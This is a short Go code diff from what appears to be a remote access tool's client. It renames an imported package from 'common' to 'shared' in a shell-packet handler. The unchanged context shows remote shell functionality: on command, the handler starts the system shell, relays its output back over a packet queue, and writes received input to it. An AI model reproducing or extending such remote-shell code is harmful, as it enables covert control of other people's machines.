@@ -6,7 +6,7 @@ import (
 	"io"
 	"os/exec"
 	"rat/client/shell"
-	"rat/common"
+	"rat/shared"
 )
 
 type ShellPacket struct {
@@ -20,8 +20,8 @@ var current struct {
 	stdout  io.ReadCloser
 }
 
-func (packet ShellPacket) Header() common.PacketHeader {
-	return common.ShellHeader
+func (packet ShellPacket) Header() shared.PacketHeader {
+	return shared.ShellHeader
 }
 
 func (packet *ShellPacket) Init() {
@@ -30,7 +30,7 @@ func (packet *ShellPacket) Init() {
 
 func (packet ShellPacket) OnReceive() error {
 	switch packet.Action {
-	case common.StartShell:
+	case shared.StartShell:
 		current.process = exec.Command(shell.GetDefault())
 		current.stdin, _ = current.process.StdinPipe()
 		current.stdout, _ = current.process.StdoutPipe()
@@ -50,10 +50,10 @@ func (packet ShellPacket) OnReceive() error {
 				Queue <- &ShellPacket{Data: s}
 			}
 		}()
-	case common.StopShell:
+	case shared.StopShell:
 		current.process.Process.Kill()
 		current.process = nil
-	case common.WriteShell:
+	case shared.WriteShell:
 		current.stdin.Write([]byte(packet.Data + shell.LineEnd))
 	}
 
